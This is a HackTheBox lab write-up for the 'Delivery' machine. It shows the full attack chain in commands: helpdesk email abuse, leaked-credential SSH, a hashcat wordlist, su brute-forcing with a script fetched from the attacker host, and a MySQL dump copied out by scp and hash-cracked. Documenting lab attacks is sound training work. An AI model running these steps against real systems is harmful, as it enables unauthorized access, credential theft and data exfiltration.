---
render_with_liquid: false
title: HackTheBox Writeup  Delivery
date: 2023-08-03 08:28:04 +1400
tags: [hackthebox, nmap, linux, mattermost, subdomain, osticket, abuse-tickets, email, misconfiguration, information-disclosure, password-reuse, hashcat, custom-wordlist, hashcat-rules, su-bruteforce, oscp-like, mysql, password-reuse, mysqldump]
---




# Recon
---

## Nmap

```bash

# Nmap 7.94 scan initiated Thu Aug  3 08:28:04 2023 as: nmap -sVC -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,80,8065 10.10.10.222
Nmap scan report for 10.10.10.222
Host is up, received user-set (0.18s latency).
Scanned at 2023-08-03 08:28:04 CST for 102s

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCq549E025Q9FR27LDR6WZRQ52ikKjKUQLmE9ndEKjB0i1qOoL+WzkvqTdqEU6fFW6AqUIdSEd7GMNSMOk66otFgSoerK6MmH5IZjy4JqMoNVPDdWfmEiagBlG3H7IZ7yAO8gcg0RRrIQjE7XTMV09GmxEUtjojoLoqudUvbUi8COHCO6baVmyjZRlXRCQ6qTKIxRZbUAo0GOY8bYmf9sMLf70w6u/xbE2EYDFH+w60ES2K906x7lyfEPe73NfAIEhHNL8DBAUfQWzQjVjYNOLqGp/WdlKA1RLAOklpIdJQ9iehsH0q6nqjeTUv47mIHUiqaM+vlkCEAN3AAQH5mB/1
|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAiAKnk2lw0GxzzqMXNsPQ1bTk35WwxCa3ED5H34T1yYMiXnRlfssJwso60D34/IM8vYXH0rznR9tHvjdN7R3hY=
|   256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEV5D6eYjySqfhW4l4IF1SZkZHxIRihnY6Mn6D8mLEW7
80/tcp   open  http    syn-ack ttl 63 nginx 1.14.2
| http-methods:
|_  Supported Methods: GET HEAD
|_http-title: Welcome
|_http-server-header: nginx/1.14.2
8065/tcp open  unknown syn-ack ttl 63
| fingerprint-strings:
|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Cache-Control: no-cache, max-age=31556926, public
|     Content-Length: 3108
|     Content-Security-Policy: frame-ancestors 'self'; script-src 'self' cdn.rudderlabs.com
|     Content-Type: text/html; charset=utf-8
|     Last-Modified: Wed, 02 Aug 2023 05:59:59 GMT
|     X-Frame-Options: SAMEORIGIN
|     X-Request-Id: t71qdnqqjprojeknt3ycpthdcy
|     X-Version-Id: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false
|     Date: Wed, 02 Aug 2023 20:28:12 GMT
|     <!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0"><meta name="robots" content="noindex, nofollow"><meta name="referrer" content="no-referrer"><title>Mattermost</title><meta name="mobile-web-app-capable" content="yes"><meta name="application-name" content="Mattermost"><meta name="format-detection" content="telephone=no"><link re
|   HTTPOptions:
|     HTTP/1.0 405 Method Not Allowed
|     Date: Wed, 02 Aug 2023 20:28:12 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8065-TCP:V=7.94%I=7%D=8/3%Time=64CAF49B%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
...
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Thu Aug  3 08:29:46 2023 -- 1 IP address (1 host up) scanned in 101.58 seconds
```

## 80 - Static Website :  Delivery

### Info

![](/assets/obsidian/a6b183882f1442a046d95a036099af54.png)

## 8065 - Website : Mattermost

### Info

![](/assets/obsidian/c073cbe68aa65f120fb214faaeecc5cb.png)

# User Flag
---

## Enum Port 8065 - Mattermost

Registered an account on mattermost

![](/assets/obsidian/7d51f6ea67d408b90fd4e4a317781d3a.png)

But it needs email verification 

![](/assets/obsidian/d45af01532333704e111d84582328e73.png)


## Enum Port 80 - OSTicket (Help Desk)

Add to hosts based on the helpdesk link observed

![](/assets/obsidian/fa0b2129977a6894aa346c6cb59da3db.png)

```bash
echo '10.10.10.222 helpdesk.delivery.htb delivery.htb' | sudo tee -a /etc/hosts
```

Tried to find more subdomains, but nothing found

```bash
gobuster vhost -u delivery.htb -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 100 --append-domain
```

Head to the helpdesk 

![](/assets/obsidian/e2c4e5f950f2448d2ce4846d0a162a9d.png)

Create a new ticket without signing in (tested XSS by the way)

![](/assets/obsidian/e058e7a6500cedef5c69d4821cfbb31e.png)

Seems like any emails went to `9495573@delivery.htb` will be redirect to the ticket thread

![](/assets/obsidian/5f8ca653d982d54ec086af673d81fe6d.png)

View the ticket 

![](/assets/obsidian/603ebcf8b534d160dc2f6a2f9753dd3f.png)

![](/assets/obsidian/2bd80e1074120ab3ed12a31b221bc5db.png)

## Successfully sign up an account on Mattermost

Go back to Mattermost and register a new account with the email `9495573@delivery.htb`

![](/assets/obsidian/04e536c127d5e589a7620ba8592c70fb.png)

Go back and view the tickets, there's the verification link!

![](/assets/obsidian/7a338e091c498d1cecefb6ff9db4e897.png)

![](/assets/obsidian/4e1bbec17bf5955cd198a53531ed94a7.png)

Clear browser cache to make the site functional again then login

![](/assets/obsidian/7aa608b4e905c27ae5b33c588b96cb1b.png)

![](/assets/obsidian/5fc5a27bee01df757d7d2d25f871b5f1.png)

![](/assets/obsidian/fdf8fa0634e43abea0b94007711a04f7.png)


## SSH as maildeliverer

Found a pair of credential in their internal team channel

![](/assets/obsidian/d8bebac51a67554ef23713f443d686a6.png)

```bash
sshpass -p 'Youve_G0t_Mail!' ssh -o "StrictHostKeyChecking no" maildeliverer@delivery.htb
```

```bash
maildeliverer@Delivery:~$ id
uid=1000(maildeliverer) gid=1000(maildeliverer) groups=1000(maildeliverer)
maildeliverer@Delivery:~$ cat user.txt
37b62137cd4bbbe0fb17256660ed00bb
```

# Root Flag
---

## Use hashcat rules to create custom wordlist

According to `root`, seems like they are using credentials that is related to : `PleaseSubscribe!`

![](/assets/obsidian/e07e41a3eba57a7cec743ba42ac4f8e7.png)

Generate a custom wordlist based on the string via **hashcat** rules

Get users

```bash
maildeliverer@Delivery:~$ cat /etc/passwd|grep sh$
root:x:0:0:root:/root:/bin/bash
maildeliverer:x:1000:1000:MailDeliverer,,,:/home/maildeliverer:/bin/bash
mattermost:x:998:998::/home/mattermost:/bin/sh
```

Write the keywords to for the rule

```bash
┌──(bravosec㉿fsociety)-[~/htb/Delivery]
└─$ echo 'PleaseSubscribe!' > keywords.txt
```

Generate wordlist with `best64.rule` (Others will be too large)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Delivery]
└─$ hashcat --force --stdout keywords.txt -r /usr/share/hashcat/rules/best64.rule > passwords_best64.txt
```

> **Best rule : **OneRuleToRuleThemAll** (2023 Updated)**
> > https://github.com/stealthsploit/OneRuleToRuleThemStill
{: .prompt-tip }


## Brute force root's password with su

Host the wordlist

```bash
┌──(bravosec㉿fsociety)-[~/htb/Delivery]
└─$ python3 -m http.server 81
```

Use **[su-bruteforce](https://github.com/carlospolop/su-bruteforce)** on target

```bash
maildeliverer@Delivery:/tmp$ wget 10.10.14.46/suBF.sh
maildeliverer@Delivery:/tmp$ chmod +x suBF.sh
maildeliverer@Delivery:/tmp$ curl -s 10.10.14.46:81/passwords_best64.txt|./suBF.sh -u root -w -
```

![](/assets/obsidian/825ce05bde3910083339190dbad58801.png)

Switch to root

```bash
maildeliverer@Delivery:/tmp$ su - root
Password:PleaseSubscribe!21
root@Delivery:~# id
uid=0(root) gid=0(root) groups=0(root)
root@Delivery:~# cat root.txt
f2de7bfa5976cf2e1167bdc68e558eb7
```

# Additional
---

## Privilege escalation from mattermost's configs


### Find mysql credentials

> This config file was not found by linpeas
{: .prompt-tip }

Find what does `mattermost` own

```bash
find / -user mattermost 2>/dev/null| grep -vE '^/proc|^/run|^/sys|^/tmp'
```

```bash
...
/opt/mattermost/config
/opt/mattermost/config/cloud_defaults.json
/opt/mattermost/config/config.json
/opt/mattermost/config/README.md
```

```bash
maildeliverer@Delivery:~$ vi /opt/mattermost/config/config.json
```

Find for keywords : `password`, `pass`, `paswd`, `user`, `secret`

> > [extrakto](https://github.com/laktak/extrakto) is a **very useful** tmux plugin to find words using [fuzzy finder](https://github.com/junegunn/fzf)
{: .prompt-info }

![](/assets/obsidian/d5a3f5dcbc86e570098601a4b2b7c722.png)

```bash
"DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s",
```


### Enumerate mysql database

Login with **mysql** (It needs to specify username and password in a weird syntax, to avoid the entering password interactively)

```bash
maildeliverer@Delivery:~# mysql -u mmuser -pCrack_The_MM_Admin_PW
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 264
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```

Start enum

```bash
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mattermost         |
+--------------------+
2 rows in set (0.001 sec)

MariaDB [(none)]> use mattermost
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [mattermost]> show tables;
+------------------------+
| Tables_in_mattermost   |
+------------------------+
| Audits                 |
...
| Tokens                 |
| UploadSessions         |
| UserAccessTokens       |
| UserGroups             |
| UserTermsOfService     |
| Users                  |
+------------------------+
46 rows in set (0.001 sec)

MariaDB [mattermost]> 
```

> **Dump mysql database**
> Since the table is large, dumping it and transfer back to attacker will be helpful in real engagements
> ```bash
> mysqldump -u mmuser -p'Crack_The_MM_Admin_PW' --opt --all-databases -r /dev/shm/.dump.sql
> sshpass -p 'Youve_G0t_Mail!' scp maildeliverer@delivery.htb:/dev/shm/.dump.sql .
> ```
> > Then use dbeaver to search through the database
{: .prompt-tip }

^40bfec

Show structure for `Users` table

```bash
MariaDB [mattermost]> describe Users;
+--------------------+--------------+------+-----+---------+-------+
| Field              | Type         | Null | Key | Default | Extra |
+--------------------+--------------+------+-----+---------+-------+
| Id                 | varchar(26)  | NO   | PRI | NULL    |       |
| CreateAt           | bigint(20)   | YES  | MUL | NULL    |       |
| UpdateAt           | bigint(20)   | YES  | MUL | NULL    |       |
| DeleteAt           | bigint(20)   | YES  | MUL | NULL    |       |
| Username           | varchar(64)  | YES  | UNI | NULL    |       |
| Password           | varchar(128) | YES  |     | NULL    |       |
| AuthData           | varchar(128) | YES  | UNI | NULL    |       |
| AuthService        | varchar(32)  | YES  |     | NULL    |       |
| Email              | varchar(128) | YES  | UNI | NULL    |       |
| EmailVerified      | tinyint(1)   | YES  |     | NULL    |       |
| Nickname           | varchar(64)  | YES  |     | NULL    |       |
| FirstName          | varchar(64)  | YES  |     | NULL    |       |
| LastName           | varchar(64)  | YES  |     | NULL    |       |
| Position           | varchar(128) | YES  |     | NULL    |       |
| Roles              | text         | YES  |     | NULL    |       |
| AllowMarketing     | tinyint(1)   | YES  |     | NULL    |       |
| Props              | text         | YES  |     | NULL    |       |
| NotifyProps        | text         | YES  |     | NULL    |       |
| LastPasswordUpdate | bigint(20)   | YES  |     | NULL    |       |
| LastPictureUpdate  | bigint(20)   | YES  |     | NULL    |       |
| FailedAttempts     | int(11)      | YES  |     | NULL    |       |
| Locale             | varchar(5)   | YES  |     | NULL    |       |
| Timezone           | text         | YES  |     | NULL    |       |
| MfaActive          | tinyint(1)   | YES  |     | NULL    |       |
| MfaSecret          | varchar(128) | YES  |     | NULL    |       |
+--------------------+--------------+------+-----+---------+-------+
25 rows in set (0.001 sec)
```

Get specific columns from the table

```bash
MariaDB [mattermost]> select Id, Username, Password from Users;
+----------------------------+----------------------------------+--------------------------------------------------------------+
| Id                         | Username                         | Password                                                     |
+----------------------------+----------------------------------+--------------------------------------------------------------+
| 64nq8nue7pyhpgwm99a949mwya | surveybot                        |                                                              |
| dijg7mcf4tf3xrgxi5ntqdefma | root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO |
| jing8rk6mjdbudcidw6wz94rdy | channelexport                    |                                                              |
...
+----------------------------+----------------------------------+--------------------------------------------------------------+
10 rows in set (0.000 sec)
```

### Crack password hash

Looks like Bcrypt, good news that the wordlist isn't too big, so it won't take much time

```bash
┌──(bravosec㉿fsociety)-[~/htb/Delivery]
└─$ vi mysql.hash

┌──(bravosec㉿fsociety)-[~/htb/Delivery]
└─$ hashcat mysql.hash passwords_best64.txt -m 3200
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Delivery]
└─$ hashcat mysql.hash passwords_best64.txt -m 3200 --show
$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21
```

### Switch to root

Since sshd_config on target does not permit root login, just use `su` to switch to root

```bash
vi /etc/ssh/sshd_config
```

![](/assets/obsidian/ba6bd45f9d280c080bc4c36d01031ab8.png)

```bash
maildeliverer@Delivery:~$ su - root
Password:
root@Delivery:~# id
uid=0(root) gid=0(root) groups=0(root)
```
